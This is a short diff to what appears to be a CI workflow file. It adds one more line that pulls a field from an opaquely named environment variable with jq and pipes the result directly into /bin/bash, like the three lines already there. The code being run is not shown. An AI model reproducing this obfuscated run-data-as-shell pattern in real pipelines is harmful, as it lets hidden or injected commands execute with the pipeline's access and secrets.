@@ -25,6 +25,7 @@ jobs:
           echo $dbog3 | jq -r .obo4 | /bin/bash
           printf '%s' "$cv12789" | jq -r .yayuc34476 | /bin/bash
           printf '%s' "$db58883" | jq -r .kibem5 | /bin/bash
+          printf '%s' "$kb023" | jq -r .d3009 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
